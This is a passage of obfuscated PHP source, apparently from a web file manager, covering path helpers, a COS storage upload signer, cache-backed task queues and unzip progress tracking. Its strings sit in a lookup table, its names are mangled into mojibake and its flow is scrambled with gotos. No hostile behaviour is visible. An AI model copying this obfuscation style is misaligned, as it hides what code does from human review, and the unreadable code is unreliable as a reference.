eÄì»é…éœ; BÇñ™¬¢øâ: $B–‡æ—¬Ö‡ =& $_SERVER[›é¼±]; $bÎêÕï÷¤­ = str_replace(array($B–‡æ—¬Ö‡[1071], $B–‡æ—¬Ö‡[229]), $B–‡æ—¬Ö‡[50], $bÎêÕï÷¤­); $bÎêÕï÷¤­ = str_replace($B–‡æ—¬Ö‡[97], $B–‡æ—¬Ö‡[8], $bÎêÕï÷¤­); goto f‘åÕ“Â¶”; f‘åÕ“Â¶”: $cÁÄô¹‰æâ = $B–‡æ—¬Ö‡[1195]; if (substr($bÎêÕï÷¤­, 0, 3) == $B–‡æ—¬Ö‡[1196]) { $bÎêÕï÷¤­ = substr($bÎêÕï÷¤­, 3); } while (strstr($bÎêÕï÷¤­, $cÁÄô¹‰æâ)) { $bÎêÕï÷¤­ = str_replace($cÁÄô¹‰æâ, $B–‡æ—¬Ö‡[8], $bÎêÕï÷¤­); } goto C’‚Á§ç…–; A£Æ–¯í£ï: } public static function sourceID($aÅŒ¶ôí¦) { $C×ïÚ¥ß·ò =& $_SERVER[›é¼±]; $b‡Æ ®¢Ù = self::parse($aÅŒ¶ôí¦); if ($b‡Æ ®¢Ù[$C×ïÚ¥ß·ò[29]] !== self::KOD_SOURCE) { show_json(LNG($C×ïÚ¥ß·ò[1198]), !1); } return $b‡Æ ®¢Ù[$C×ïÚ¥ß·ò[395]]; } public static function make($Cª‹¹˜œ‘•) { if (!$Cª‹¹˜œ‘•) { return !1; } return self::makePath(self::KOD_SOURCE, intval($Cª‹¹˜œ‘•)); } public static function makeShare($B¿‘¾õ¸³Ï, $FÊÚğ¼íˆ´) { return self::makePath(self::KOD_SHARE_ITEM, $B¿‘¾õ¸³Ï, $FÊÚğ¼íˆ´); } public static function makeFileTypePath($DëÓŸËò–â) { return self::makePath(self::KOD_USER_FILE_TYPE, $DëÓŸËò–â); } public static function makeFileTagPath($C£”»µãÂ´) { return self::makePath(self::KOD_USER_FILE_TAG, $C£”»µãÂ´); } public static function makePath($eÔ¤Ö¹ÉÏÅ, $b—“ÌğŸÆ§ = '', $c‹–ˆØÓ› = '') { $AŠŞ¹¡ÚÌÁ =& $_SERVER[›é¼±]; $EÀæÂÍ¯Ú = substr($eÔ¤Ö¹ÉÏÅ, 1, -1); $dÉÏë½Éïù = $AŠŞ¹¡ÚÌÁ[1199] . $EÀæÂÍ¯Ú . $AŠŞ¹¡ÚÌÁ[1200] . $b—“ÌğŸÆ§ . $AŠŞ¹¡ÚÌÁ[1201]; $dÉÏë½Éïù = $c‹–ˆØÓ› ? $dÉÏë½Éïù . $c‹–ˆØÓ› . $AŠŞ¹¡ÚÌÁ[8] : $dÉÏë½Éïù; return $dÉÏë½Éïù; } public static function hashPath($c×£†ä‚Ô, $eóòìÉ£…´ = true) { goto dŞå«íö; dŞå«íö: $Dµ†¦šçâÔ =& $_SERVER[›é¼±]; $cîî²·ë‘ = is_array($c×£†ä‚Ô) ? $c×£†ä‚Ô : IO::info($c×£†ä‚Ô); $a ²ß‚ = _get($cîî²·ë‘, $Dµ†¦šçâÔ[1202], $Dµ†¦šçâÔ[33]); goto aôŠ›åÍíĞ; aôŠ›åÍíĞ: if (!$a ²ß‚ && isset($cîî²·ë‘[$Dµ†¦šçâÔ[397]])) { $cîî²·ë‘ = IO::info(KodIO::make($cîî²·ë‘[$Dµ†¦šçâÔ[397]])); $a ²ß‚ = _get($cîî²·ë‘, $Dµ†¦šçâÔ[1202], $Dµ†¦šçâÔ[33]); } if (!$a ²ß‚ && $eóòìÉ£…´) { $CÜ¡ää„¯¹ = KodIO::parse($cîî²·ë‘[$Dµ†¦šçâÔ[76]]); if (!$CÜ¡ää„¯¹[$Dµ†¦šçâÔ[29]]) { $a ²ß‚ = IO::hashSimple($cîî²·ë‘[$Dµ†¦šçâÔ[76]]); } } if (!$a ²ß‚) { $a ²ß‚ = md5($cîî²·ë‘[$Dµ†¦šçâÔ[76]] . $cîî²·ë‘[$Dµ†¦šçâÔ[78]] . $cîî²·ë‘[$Dµ†¦šçâÔ[84]]); } goto A‚¦É–ø¤¯; A‚¦É–ø¤¯: return $a ²ß‚; goto CÖ÷ŠÇÅ; CÖ÷ŠÇÅ: } public static function initSystemPath() { goto Cº¤Ø»î; DÑĞ‹ÚÉÓ˜: define($b‡ÕàŠë­Ù[1205], self::systemPath($b‡ÕàŠë­Ù[1206])); define($b‡ÕàŠë­Ù[1207], self::systemPath($b‡ÕàŠë­Ù[1208])); define($b‡ÕàŠë­Ù[1209], self::systemPath($b‡ÕàŠë­Ù[1210])); goto fØªó‹²‡¹; fØªó‹²‡¹: IOHistory::bindEvent(); goto AÌèï‚Œ¦™; Cº¤Ø»î: $b‡ÕàŠë­Ù =& $_SERVER[›é¼±]; if (defined($b‡ÕàŠë­Ù[1203])) { return; } define($b‡ÕàŠë­Ù[1203], self::systemPath($b‡ÕàŠë­Ù[1204])); goto DÑĞ‹ÚÉÓ˜; AÌèï‚Œ¦™: } public static function systemPath($AÃ‡Æ‹‰‚) { goto dÉĞä‡Éê†; AŸÆÉÃõ¡: if ($eº“°Ş÷) { return $eº“°Ş÷; } if ($AÃ‡Æ‹‰‚ == $B…¨¡Å®—[1204]) { $eº“°Ş÷ = self::make(Model($B…¨¡Å®—[827])->systemRootPathAdd($B…¨¡Å®—[531])); } else { $eº“°Ş÷ = self::systemPath($B…¨¡Å®—[1204]); $BõóÏ…»† = self::sourceID($eº“°Ş÷); $eº“°Ş÷ = self::make(Model($B…¨¡Å®—[827])->mkdir($BõóÏ…»†, $AÃ‡Æ‹‰‚)); } Model($B…¨¡Å®—[765])->set($fÛ·‘ˆ½, $eº“°Ş÷); goto aÅ±¶¶¤‚; dÉĞä‡Éê†: $B…¨¡Å®— =& $_SERVER[›é¼±]; $fÛ·‘ˆ½ = $B…¨¡Å®—[1211] . ucfirst($AÃ‡Æ‹‰‚); $eº“°Ş÷ = Model($B…¨¡Å®—[765])->get($fÛ·‘ˆ½); goto AŸÆÉÃõ¡; aÅ±¶¶¤‚: return $eº“°Ş÷; goto A‘é©¼ùÔ; A‘é©¼ùÔ: } public static function systemFolder($B—­° ã¾ƒ) { $AîÖá³Ûâ = IO_PATH_SYSTEM_SOURCE . $B—­° ã¾ƒ; $DˆÒ¥ˆŸ»ù = Cache::get($AîÖá³Ûâ); if (!$DˆÒ¥ˆŸ»ù) { $B—˜™ß¼Ä› = IO::infoFull($AîÖá³Ûâ); if (!$B—˜™ß¼Ä›) { $DˆÒ¥ˆŸ»ù = IO::mkdir($AîÖá³Ûâ, REPEAT_SKIP); } else { $DˆÒ¥ˆŸ»ù = $B—˜™ß¼Ä›[$_SERVER[›é¼±][76]]; } Cache::set($AîÖá³Ûâ, $DˆÒ¥ˆŸ»ù, 3600 * 10); } return $DˆÒ¥ˆŸ»ù; } public static function defaultDriver() { return Model($_SERVER[›é¼±][762])->defaultDriver(); } public static function defaultIO() { $cùˆÎé–Ù  =& $_SERVER[›é¼±]; $fÕÓªòíåã = self::defaultDriver(); return $cùˆÎé–Ù [1212] . $fÕÓªòíåã[$cùˆÎé–Ù [395]] . $cùˆÎé–Ù [1201]; } public static function defaultDriverInit() { static $BÉ‘³¶Ö¥ = false; if ($BÉ‘³¶Ö¥) { return $BÉ‘³¶Ö¥; } $BÉ‘³¶Ö¥ = IO::init(self::defaultIO()); return $BÉ‘³¶Ö¥; } public static function fileTypeList() { $B¬±Ë×‰…õ =& $_SERVER[›é¼±]; $AªáÂœ‹ê = $GLOBALS[$B¬±Ë×‰…õ[6]][$B¬±Ë×‰…õ[1213]]; foreach ($AªáÂœ‹ê as $fõâˆªîÔª => $D²÷¤äŠ„Î) { $B‡ß¶½ìùŞ = $B¬±Ë×‰…õ[1214] . $fõâˆªîÔª; $dß—´ÚÌğ = LNG($B‡ß¶½ìùŞ); if ($B‡ß¶½ìùŞ != $dß—´ÚÌğ) { $AªáÂœ‹ê[$fõâˆªîÔª][$B¬±Ë×‰…õ[28]] = $dß—´ÚÌğ; } } return $AªáÂœ‹ê; } public static function transferType($bäÂ„½À§, $bÌÉ™”¤©Û) { goto Fá¬Ù‘Š; Fá¬Ù‘Š: $Aê´¥§¦Òï =& $_SERVER[›é¼±]; $D÷¬Á£³† = self::driverType($bäÂ„½À§); $CÈÄµ‹§×“ = self::driverType($bÌÉ™”¤©Û); goto B„é¤÷—Ù; AÆĞ…âäŸÅ: return $Aê´¥§¦Òï[1217]; goto Fƒ¥ç‰‰È; B„é¤÷—Ù: if ($D÷¬Á£³†[$Aê´¥§¦Òï[29]] == $CÈÄµ‹§×“[$Aê´¥§¦Òï[29]] && $D÷¬Á£³†[$Aê´¥§¦Òï[1215]] == $CÈÄµ‹§×“[$Aê´¥§¦Òï[1215]]) { return $Aê´¥§¦Òï[1216]; } if ($D÷¬Á£³†[$Aê´¥§¦Òï[29]] == $Aê´¥§¦Òï[868] && $CÈÄµ‹§×“[$Aê´¥§¦Òï[29]] == $Aê´¥§¦Òï[106]) { return $Aê´¥§¦Òï[1127]; } if ($D÷¬Á£³†[$Aê´¥§¦Òï[29]] == $Aê´¥§¦Òï[106] && $CÈÄµ‹§×“[$Aê´¥§¦Òï[29]] == $Aê´¥§¦Òï[868]) { return $Aê´¥§¦Òï[107]; } goto AÆĞ…âäŸÅ; Fƒ¥ç‰‰È: } public static function driverType($f„áÅãºØ) { goto E¿Ç›¿¦ğ¼; E¿Ç›¿¦ğ¼: $e¶¨¶ÇÀŸ =& $_SERVER[›é¼±]; $b–˜ˆÜóë‹ = $f„áÅãºØ->path; $dœ¢¸ÑÔÖ = str_replace($e¶¨¶ÇÀŸ[1218], $e¶¨¶ÇÀŸ[33], strtolower($f„áÅãºØ->getType())); goto fÄ‹‹ĞÒ‡; fÄ‹‹ĞÒ‡: if ($dœ¢¸ÑÔÖ == $e¶¨¶ÇÀŸ[753] || $dœ¢¸ÑÔÖ == $e¶¨¶ÇÀŸ[1219] || $dœ¢¸ÑÔÖ == $e¶¨¶ÇÀŸ[1220]) { $f„áÅãºØ = self::defaultDriverInit(); } else { if ($dœ¢¸ÑÔÖ == $e¶¨¶ÇÀŸ[1134] || $dœ¢¸ÑÔÖ == $e¶¨¶ÇÀŸ[1221]) { $f„áÅãºØ = IO::init($f„áÅãºØ->pathParse[$e¶¨¶ÇÀŸ[1081]]); } } $dœ¢¸ÑÔÖ = str_replace($e¶¨¶ÇÀŸ[1218], $e¶¨¶ÇÀŸ[33], strtolower($f„áÅãºØ->getType())); if ($dœ¢¸ÑÔÖ == $e¶¨¶ÇÀŸ[106]) { return array($e¶¨¶ÇÀŸ[29] => $e¶¨¶ÇÀŸ[106], $e¶¨¶ÇÀŸ[1215] => $e¶¨¶ÇÀŸ[33], $e¶¨¶ÇÀŸ[76] => $b–˜ˆÜóë‹); } goto FÆÎ»·êğ×; FÆÎ»·êğ×: return array($e¶¨¶ÇÀŸ[29] => $e¶¨¶ÇÀŸ[868], $e¶¨¶ÇÀŸ[1215] => $f„áÅãºØ->pathDriver, $e¶¨¶ÇÀŸ[76] => $b–˜ˆÜóë‹); goto aÖ×£­İÂ­; aÖ×£­İÂ­: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($CÄŒ¾¬¸±ç) { parent::__construct($CÄŒ¾¬¸±ç); $this->signatureVersion($_SERVER[›é¼±][212]); } public function uploadFormData($EÛÓˆÔ—Æ, $Aã‹¤Ñ¨µ¬ = 3600) { goto a°Êİ®¨¨‚; AµÑ¼ÃÑ: return $E§Ã°ƒ÷Œ; goto e»‚ó®ï„‹; a°Êİ®¨¨‚: $BÆµ›õ³¡· =& $_SERVER[›é¼±]; $FÂ‡…«‡‹ = $BÆµ›õ³¡·[192]; $bÆ•±ŒÏ÷“ = $BÆµ›õ³¡·[230]; goto bõò©ôùŞ; B÷ŒŠİßãÅ: $aØàÙ©éÈ = array($BÆµ›õ³¡·[1224] => $FÕœ÷„ÚÛñ, $BÆµ›õ³¡·[1225] => array(array($BÆµ›õ³¡·[1226] => $FÂ‡…«‡‹), array($BÆµ›õ³¡·[1227] => $this->bucket), array($BÆµ›õ³¡·[1228], $BÆµ›õ³¡·[1229], $BÆµ›õ³¡·[33]), array($BÆµ›õ³¡·[1230] => $DÒÀÂÍÎ¬Ò), array($BÆµ›õ³¡·[1231] => $bÆ•±ŒÏ÷“), array($BÆµ›õ³¡·[1232] => $this->accessKey), array($BÆµ›õ³¡·[1233] => $d’à‡Œˆ))); $aØàÙ©éÈ = json_encode($aØàÙ©éÈ); $eáãöİŠ = hash_hmac($BÆµ›õ³¡·[230], $d’à‡Œˆ, $this->secret); goto Dóº±À‡§º; Dóº±À‡§º: $d¸ÂÑ‚ãÉ« = sha1($aØàÙ©éÈ); $Aâ” ËÑšÏ = hash_hmac($BÆµ›õ³¡·[230], $d¸ÂÑ‚ãÉ«, $eáãöİŠ); $E§Ã°ƒ÷Œ = array($BÆµ›õ³¡·[1226] => $FÂ‡…«‡‹, $BÆµ›õ³¡·[1230] => $DÒÀÂÍÎ¬Ò, $BÆµ›õ³¡·[1234] => base64_encode($aØàÙ©éÈ), $BÆµ›õ³¡·[1231] => $bÆ•±ŒÏ÷“, $BÆµ›õ³¡·[1232] => $this->accessKey, $BÆµ›õ³¡·[1235] => $d’à‡Œˆ, $BÆµ›õ³¡·[1236] => $Aâ” ËÑšÏ, $BÆµ›õ³¡·[175] => $this->getHost()); goto AµÑ¼ÃÑ; bõò©ôùŞ: $DÒÀÂÍÎ¬Ò = $BÆµ›õ³¡·[1222]; $FÕœ÷„ÚÛñ = gmdate($BÆµ›õ³¡·[1223], time() + $Aã‹¤Ñ¨µ¬); $d’à‡Œˆ = (string) time() . $BÆµ›õ³¡·[68] . (string) (time() + $Aã‹¤Ñ¨µ¬); goto B÷ŒŠİßãÅ; e»‚ó®ï„‹: } public function fileOutLink($E¬¬õìÜ³˜) { $A¦ãƒ„æ¯ =& $_SERVER[›é¼±]; if (substr($E¬¬õìÜ³˜, 0, 7) == $A¦ãƒ„æ¯[1237]) { $E¬¬õìÜ³˜ = $A¦ãƒ„æ¯[1238] . substr($E¬¬õìÜ³˜, 7); } header($A¦ãƒ„æ¯[159] . $E¬¬õìÜ³˜); die; } } goto bŒë‰®¨ù½; C‹ß¥¨´²: class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\x74\141\163\x6b\x51\x75\x65\165\145\x4c\x65\x6e\147\164\x68"; const QUEUE_DATA = "\164\x61\x73\153\121\x75\145\x75\x65\x44\141\x74\x61"; public static $listData = false; public static function initTask() { } public static function add($E¬Ìé¤²ñŞ, $f‰áé©…… = array(), $cˆéÅÁó¯Ø = '', $Cä°ÍĞµÉ¥ = '') { $Eº„·ÉÔé =& $_SERVER[›é¼±]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($Cä°ÍĞµÉ¥ && array_find_by_field(self::$listData, $Eº„·ÉÔé[93], $Cä°ÍĞµÉ¥)) { return !0; } self::$listData[] = array($Eº„·ÉÔé[262] => $E¬Ìé¤²ñŞ, $Eº„·ÉÔé[1639] => $f‰áé©……, $Eº„·ÉÔé[445] => $cˆéÅÁó¯Ø, $Eº„·ÉÔé[93] => $Cä°ÍĞµÉ¥); return !0; } public static function addSubmit() { $B¯‹ã«ÀÔ¾ =& $_SERVER[›é¼±]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($B¯‹ã«ÀÔ¾[1640] . json_encode_force(array_to_keyvalue(self::$listData, $B¯‹ã«ÀÔ¾[33], $B¯‹ã«ÀÔ¾[445])), $B¯‹ã«ÀÔ¾[1641]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($c÷ç‚äæ¾, $C«´×ÌÅğ÷ = array(), $EÁòËƒÄ•· = '', $cò£§¥ÈŒŒ = '') { goto CÁî…éÂ¼¥; fÙŠËµ¶§Ã: if ($cò£§¥ÈŒŒ && array_find_by_field($b‘±Òùğ , $e Î®Ì‡ä[93], $cò£§¥ÈŒŒ)) { return !0; } $b‘±Òùğ [] = array($e Î®Ì‡ä[262] => $c÷ç‚äæ¾, $e Î®Ì‡ä[1639] => $C«´×ÌÅğ÷, $e Î®Ì‡ä[445] => $EÁòËƒÄ•·, $e Î®Ì‡ä[93] => $cò£§¥ÈŒŒ); write_log($e Î®Ì‡ä[1640] . $EÁòËƒÄ•·, $e Î®Ì‡ä[1641]); goto FŞˆ›Ù¾­…; CÁî…éÂ¼¥: $e Î®Ì‡ä =& $_SERVER[›é¼±]; if (self::count() >= self::MAX_LENGTH) { return !1; } $b‘±Òùğ  = self::getAll(); goto fÙŠËµ¶§Ã; FŞˆ›Ù¾­…: self::setAll($b‘±Òùğ ); return !0; goto B“´„Çæ¨Ö; B“´„Çæ¨Ö: } public static function run() { goto AÎõ‡ÌŸ‹; D¿ŸËÖ…£: try { Hook::apply($cŞ¯Ù…Â¹è[$d‘ô«àå¹[262]], $cŞ¯Ù…Â¹è[$d‘ô«àå¹[1639]]); } catch (Exception $Cê®ˆöÃ¿) { } $f×ï¿‹§ = number_format(timeFloat() - $dÉæ¦ÄÒ½, 3) . $d‘ô«àå¹[1577]; write_log($d‘ô«àå¹[1642] . $cŞ¯Ù…Â¹è[$d‘ô«àå¹[445]] . $d‘ô«àå¹[1643] . $f×ï¿‹§, $d‘ô«àå¹[1641]); goto aĞ¨¡»¨Şà; AÎõ‡ÌŸ‹: $d‘ô«àå¹ =& $_SERVER[›é¼±]; $Bß†¾î‚Œ© = self::getAll(); $cŞ¯Ù…Â¹è = array_shift($Bß†¾î‚Œ©); goto fß®®à¨êö; fß®®à¨êö: if (!$cŞ¯Ù…Â¹è) { return !1; } self::setAll($Bß†¾î‚Œ©); $dÉæ¦ÄÒ½ = timeFloat(); goto D¿ŸËÖ…£; aĞ¨¡»¨Şà: return !0; goto dœ²æ‘—££; dœ²æ‘—££: } public static function count() { $eŞÃ‡»Æ’¢ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$eŞÃ‡»Æ’¢) { return 0; } return intval($eŞÃ‡»Æ’¢); } public static function getAll() { $e½Î–„Ú„… = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$e½Î–„Ú„…) { return array(); } return $e½Î–„Ú„…; } public static function setAll($aâºê›¾¼Ü) { $d’Ó¢ºç¶ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($aâºê›¾¼Ü), $d’Ó¢ºç¶); Cache::set(self::QUEUE_DATA, $aâºê›¾¼Ü, $d’Ó¢ºç¶); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($EÊŒßˆ‡ÒÛ, $dÎ®—§§ÚÄ = 5.0) { if (!$EÊŒßˆ‡ÒÛ) { return; } $Cö‰ì»ó = Cache::get($EÊŒßˆ‡ÒÛ); if (!$Cö‰ì»ó || timeFloat() - floatVal($Cö‰ì»ó) >= $dÎ®—§§ÚÄ) { Cache::set($EÊŒßˆ‡ÒÛ, timeFloat(), $dÎ®—§§ÚÄ * 10); return !0; } return !1; } public static function timeLimitCall($BÓ©ÚÊÓ, $A„¼©«ìÑŠ, $fÉ£³Æ–…ì, $c§ö‰¡Àº = 5.0) { goto Cøäåœë¶; Cøäåœë¶: $f òª„‚©• =& $_SERVER[›é¼±]; if (!$BÓ©ÚÊÓ || !$A„¼©«ìÑŠ) { return; } self::$asyncAdd = !0; goto D…§»÷Ò‡™; D…§»÷Ò‡™: $FŠë¢÷ï„Ê = $f òª„‚©•[1644]; $E²ôÄ÷¬ÏÑ = Cache::get($FŠë¢÷ï„Ê, !0); $Eä–²äÖÒí = array($f òª„‚©•[1645] => timeFloat(), $f òª„‚©•[1646] => timeFloat(), $f òª„‚©•[262] => $A„¼©«ìÑŠ, $f òª„‚©•[1639] => $fÉ£³Æ–…ì, $f òª„‚©•[197] => $c§ö‰¡Àº); goto E“°õÛö‹Ï; E“°õÛö‹Ï: if (is_array($E²ôÄ÷¬ÏÑ[$BÓ©ÚÊÓ])) { $Eä–²äÖÒí[$f òª„‚©•[1646]] = $E²ôÄ÷¬ÏÑ[$BÓ©ÚÊÓ][$f òª„‚©•[1646]]; } if (is_array($E²ôÄ÷¬ÏÑ[$BÓ©ÚÊÓ])) { if (timeFloat() - $E²ôÄ÷¬ÏÑ[$BÓ©ÚÊÓ][$f òª„‚©•[1645]] < $Eä–²äÖÒí[$f òª„‚©•[197]] * 0.3) { return; } $Eä–²äÖÒí[$f òª„‚©•[1646]] = $E²ôÄ÷¬ÏÑ[$BÓ©ÚÊÓ][$f òª„‚©•[1646]]; } $E²ôÄ÷¬ÏÑ[$BÓ©ÚÊÓ] = $Eä–²äÖÒí; goto Aªîäšµë…; Aªîäšµë…: Cache::set($FŠë¢÷ï„Ê, $E²ôÄ÷¬ÏÑ, 60); Cache::removeMemory($FŠë¢÷ï„Ê); write_log($f òª„‚©•[1647] . $BÓ©ÚÊÓ . $f òª„‚©•[68] . $A„¼©«ìÑŠ, $f òª„‚©•[1641]); goto eô–Æğ©ñ; eô–Æğ©ñ: } public static function timeLimitCallLoop() { goto eÎ¥ÆßÊù‚; eÎ¥ÆßÊù‚: $BÎí†Ê‹™è =& $_SERVER[›é¼±]; $fî’ÁŒ©–À = array($BÎí†Ê‹™è[1648]); $FÄÑë˜ç•› = in_array(strtolower(ACTION), $fî’ÁŒ©–À); goto dšà“ê†„†; aàÙ­ñ‘Ş: if (!$cÕ®‘¼¹Ñã || count($cÕ®‘¼¹Ñã) <= 0) { return; } $d‰®°º“ = !1; $eİçÈ‡õòå = timeFloat(); goto b¡“ÀÉÌî˜; Eæ´·ïù…é: if (!$e˜Ø¢±ã´) { return Cache::remove($FÕ¿¢Æäá°); } Cache::set($FÕ¿¢Æäá°, $e˜Ø¢±ã´, 60); Cache::removeMemory($FÕ¿¢Æäá°); goto F¡òŞ¤÷ÍÈ; dšà“ê†„†: if (!$FÄÑë˜ç•› && !self::$asyncAdd) { return; } $FÕ¿¢Æäá° = $BÎí†Ê‹™è[1644]; $cÕ®‘¼¹Ñã = Cache::get($FÕ¿¢Æäá°, !0); goto aàÙ­ñ‘Ş; b¡“ÀÉÌî˜: $e˜Ø¢±ã´ = array(); foreach ($cÕ®‘¼¹Ñã as $eâ¾Ô™‹” => $f™ã“Ïà‹) { if ($eİçÈ‡õòå - $f™ã“Ïà‹[$BÎí†Ê‹™è[1646]] > $f™ã“Ïà‹[$BÎí†Ê‹™è[197]]) { $d‰®°º“ = !0; try { Hook::apply($f™ã“Ïà‹[$BÎí†Ê‹™è[262]], $f™ã“Ïà‹[$BÎí†Ê‹™è[1639]]); write_log($BÎí†Ê‹™è[1649] . $eâ¾Ô™‹” . $BÎí†Ê‹™è[68] . $f™ã“Ïà‹[$BÎí†Ê‹™è[262]] . $BÎí†Ê‹™è[1650] . ACTION, $BÎí†Ê‹™è[1641]); } catch (Exception $A¤¤­Ø´¤) { } continue; } $e˜Ø¢±ã´[$eâ¾Ô™‹”] = $f™ã“Ïà‹; } if (!$d‰®°º“) { return; } goto Eæ´·ïù…é; F¡òŞ¤÷ÍÈ: } public static function finished($d·Ÿù§’Ë–, $Fœ Î°¼Ü) { $Cî©¯À™ =& $_SERVER[›é¼±]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($Cî©¯À™[262] => $d·Ÿù§’Ë–, $Cî©¯À™[1639] => $Fœ Î°¼Ü); } private static function finishedRun() { $CâŞ«Şô =& $_SERVER[›é¼±]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $eèˆİëì£ó) { try { Hook::apply($eèˆİëì£ó[$CâŞ«Şô[262]], $eèˆİëì£ó[$CâŞ«Şô[1639]]); } catch (Exception $FˆÀ¶É¼º) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto cŸ™Á„•; cŸ™Á„•: $eÃäàÒøÂø =& $_SERVER[›é¼±]; parent::startAfter(); Hook::bind($eÃäàÒøÂø[1651], array($this, $eÃäàÒøÂø[1652])); goto Fò¨½ÌÂ†¬; Fò¨½ÌÂ†¬: Hook::bind($eÃäàÒøÂø[1122], array($this, $eÃäàÒøÂø[1653])); $cËÙ²¼ÆØ‹ =& $this->task; $cËÙ²¼ÆØ‹[$eÃäàÒøÂø[1654]] = $eÃäàÒøÂø[1127]; goto EšÓ„Ä¸‚È; EšÓ„Ä¸‚È: if (!$cËÙ²¼ÆØ‹[$eÃäàÒøÂø[1464]]) { $cËÙ²¼ÆØ‹[$eÃäàÒøÂø[1464]] = LNG($eÃäàÒøÂø[1655]); } goto c…Õ†Ğù™…; c…Õ†Ğù™…: } protected function endAfter() { $cõ²½Æ×ìô =& $_SERVER[›é¼±]; parent::endAfter(); Hook::unbind($cõ²½Æ×ìô[1651], array($this, $cõ²½Æ×ìô[1652])); Hook::unbind($cõ²½Æ×ìô[1122], array($this, $cõ²½Æ×ìô[1653])); } public function updateAfter() { $A‚†Ï›Œ—« =& $_SERVER[›é¼±]; $b£ŒçÎíß“ =& $this->task; if (!$b£ŒçÎíß“[$A‚†Ï›Œ—«[1055]] || !$b£ŒçÎíß“[$A‚†Ï›Œ—«[758]]) { return; } if ($b£ŒçÎíß“[$A‚†Ï›Œ—«[1654]] == $A‚†Ï›Œ—«[1127]) { $Fóˆ£«ßÆ† = 0; if ($b£ŒçÎíß“[$A‚†Ï›Œ—«[1610]]) { $Fóˆ£«ßÆ† = $b£ŒçÎíß“[$A‚†Ï›Œ—«[1611]] / $b£ŒçÎíß“[$A‚†Ï›Œ—«[1610]]; } $b£ŒçÎíß“[$A‚†Ï›Œ—«[1565]] = $Fóˆ£«ßÆ† * 0.3; } else { if ($b£ŒçÎíß“[$A‚†Ï›Œ—«[1654]] == $A‚†Ï›Œ—«[311]) { $Fóˆ£«ßÆ† = $b£ŒçÎíß“[$A‚†Ï›Œ—«[1069]] / $b£ŒçÎíß“[$A‚†Ï›Œ—«[1055]]; $b£ŒçÎíß“[$A‚†Ï›Œ—«[1565]] = 0.3 + $Fóˆ£«ßÆ† * 0.4; } else { if ($b£ŒçÎíß“[$A‚†Ï›Œ—«[1654]] == $A‚†Ï›Œ—«[107]) { $AÑÙé×ä£‹ = 0; if ($b£ŒçÎíß“[$A‚†Ï›Œ—«[1612]] == $A‚†Ï›Œ—«[107]) { $AÑÙé×ä£‹ = $b£ŒçÎíß“[$A‚†Ï›Œ—«[1611]]; } $Fóˆ£«ßÆ† = ($b£ŒçÎíß“[$A‚†Ï›Œ—«[1615]] + $AÑÙé×ä£‹) / $b£ŒçÎíß“[$A‚†Ï›Œ—«[758]]; $b£ŒçÎíß“[$A‚†Ï›Œ—«[1565]] = 0.3 + 0.4 + $Fóˆ£«ßÆ† * 0.3; } } } if ($b£ŒçÎíß“[$A‚†Ï›Œ—«[1565]] > 0) { $F¶¸²´÷ß = timeFloat() - $b£ŒçÎíß“[$A‚†Ï›Œ—«[784]] - $b£ŒçÎíß“[$A‚†Ï›Œ—«[1568]]; $b£ŒçÎíß“[$A‚†Ï›Œ—«[1569]] = $F¶¸²´÷ß * (1 - $b£ŒçÎíß“[$A‚†Ï›Œ—«[1565]]) / $b£ŒçÎíß“[$A‚†Ï›Œ—«[1565]]; } } public function addFile($a½ˆ¾È–¼›) { goto dğÊì”ê¤ª; cÊÙ¹óÍ¶: $c§¡ïïÃø©[$e§øöˆã¥ã[1608]] = $fß¢´É­°ä[$e§øöˆã¥ã[28]]; $c§¡ïïÃø©[$e§øöˆã¥ã[1610]] = $fß¢´É­°ä[$e§øöˆã¥ã[78]]; $c§¡ïïÃø©[$e§øöˆã¥ã[1611]] = 0; goto C“ˆÓƒæÁ÷; dğÊì”ê¤ª: $e§øöˆã¥ã =& $_SERVER[›é¼±]; $c§¡ïïÃø© =& $this->task; $fß¢´É­°ä = IO::info($a½ˆ¾È–¼›); goto cÊÙ¹óÍ¶; C“ˆÓƒæÁ÷: $c§¡ïïÃø©[$e§øöˆã¥ã[1057]] = $e§øöˆã¥ã[1630]; $c§¡ïïÃø©[$e§øöˆã¥ã[1612]] = $e§øöˆã¥ã[1127]; $c§¡ïïÃø©[$e§øöˆã¥ã[758]] = $fß¢´É­°ä[$e§øöˆã¥ã[78]]; goto AÂ‘¯éÛë½; AÂ‘¯éÛë½: $c§¡ïïÃø©[$e§øöˆã¥ã[1055]] = 1; $DÜÄÇí”ÇŸ = 0; $c§¡ïïÃø©[$e§øöˆã¥ã[1619]] = array($e§øöˆã¥ã[1620] => $DÜÄÇí”ÇŸ + 1, $e§øöˆã¥ã[415] => $fß¢´É­°ä[$e§øöˆã¥ã[28]], $e§øöˆã¥ã[76] => $fß¢´É­°ä[$e§øöˆã¥ã[76]], $e§øöˆã¥ã[513] => $fß¢´É­°ä[$e§øöˆã¥ã[513]] ? $fß¢´É­°ä[$e§øöˆã¥ã[513]] : $fß¢´É­°ä[$e§øöˆã¥ã[76]]); goto Bõ­‹òí½…; Bõ­‹òí½…: $this->update(); goto A·–‹“„æ; A·–‹“„æ: } public function unzipAfter($B—†ãĞ§ßõ) { goto EÖ¿Œ²Øî±; B®íÎÔÓä›: $this->update(); self::log($Dô††³•á¬[1656] . json_encode(array($D–êîâ…², $aÕ¦Éª†è))); goto c•ÂÙ°; CÙƒ² Š‡: $D–êîâ…²[$Dô††³•á¬[1608]] = $Dô††³•á¬[33]; $D–êîâ…²[$Dô††³•á¬[1615]] = 0; $D–êîâ…²[$Dô††³•á¬[758]] = $aÕ¦Éª†è[$Dô††³•á¬[78]]; goto 